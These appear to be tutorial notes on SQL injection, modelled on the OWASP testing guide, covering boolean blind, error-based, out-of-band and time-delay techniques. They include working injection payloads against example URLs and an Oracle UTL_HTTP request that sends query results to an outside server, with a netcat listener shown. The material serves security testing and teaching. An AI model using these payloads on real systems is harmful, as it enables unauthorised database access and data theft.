#### SQL Injection attacks can be divided into the following three classes:
- **Inband:** data is extracted using the same channel that is used to inject the SQL code.
- **Out-of-band:** data is retrieved using a different channel (e.g., an email).
- **Inferential or Blind:** there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.


#### The techniques to exploit SQL injection flaws there are five commons techniques
-   **Union Operator:** can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.
-   **Boolean:** use Boolean condition(s) to verify whether certain conditions are true or false.
-   **Error based:** this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.
-   **Out-of-band:** technique used to retrieve data using a different channel (e.g., make a HTTP connection to send the results to a web server).
-   **Time delay:** use database commands (e.g. sleep) to delay answers in conditional queries. It is useful when attacker doesn’t have some kind of answer (result, output, or error) from the application.

## Detection Techniques
-   Authentication forms
-   Search engines:
-   E-Commerce sites
-   The tester has to make a list of all input fields whose values could be used in crafting a SQL query, **including the hidden fields of POST requests** and then test them separately.

## Boolean Exploitation Technique
The Boolean exploitation technique is very useful when the tester finds a [**Blind SQL Injection**](https://owasp.org/www-community/attacks/Blind_SQL_Injection) situation.

We suppose that the query executed on the server is:
```text
SELECT field1, field2, field3 FROM Users WHERE Id='$Id'
```

The tests that we will execute will allow us to obtain the value of the username field, extracting such value character by character. This is possible through the use of some standard functions, present in practically every database.
-   **SUBSTRING (text, start, length):** returns a substring starting from the position “start” of text and of length “length”. If “start” is greater than the length of text, the function returns a null value.
- **ASCII (char):** it gives back ASCII value of the input character. A null value is returned if char is 0.
-   **LENGTH (text):** it gives back the number of characters in the input text.


```text
1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1
```

```text
1' AND LENGTH(username)=N AND '1' = '1
```
## Error Based Exploitation Technique
The Error based technique consists in **forcing the database to perform some operation in which the result will be an error**. The point here is to try to extract some data from the database and show it in the error message.
Consider the following SQL query:
```text
SELECT * FROM products WHERE id_product=$id_product
```
Consider also the request to a script who executes the query above:
```text
http://www.example.com/product.php?id=10
```
The malicious request would be (e.g. Oracle 10g):
```text
http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--
```
In this example, the tester is concatenating the value 10 with the result of the function `UTL_INADDR.GET_HOST_NAME`. This Oracle function will try to return the hostname of the parameter passed to it, which is other query, the name of the user. When the database looks for a hostname with the user database name, it will fail and return an error message like:
```text
ORA-292257: host SCOTT unknown
```
## Out of Band Exploitation Technique
The technique consists of the use of DBMS functions to perform an out of band connection and deliver the results of the injected query as part of the request to the tester’s server.
Consider the following SQL query:
```text
SELECT * FROM products WHERE id_product=$id_product
```
Consider also the request to a script who executes the query above:
```text
http://www.example.com/product.php?id=10
```
The malicious request would be:
```text
http://www.example.com/product.php?id=10||UTL_HTTP.request(‘server.com:80’||(SELECT user FROM DUAL)--
```
In this example, the tester is concatenating the value 10 with the result of the function `UTL_HTTP.request`. This Oracle function will try to connect to `testerserver` and make a HTTP GET request containing the return from the query `SELECT user FROM DUAL`.
```bash
$nc -nvlp 80

GET /SCOTT HTTP/1.1
Host: testerserver.com
Connection: close
```
## Time Delay Exploitation Technique
This technique consists in sending an injected query and in case the conditional is true, the tester can monitor the time taken to for the server to respond.
The malicious request would be (e.g.**MySql 5.x**):
```text
http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--
```
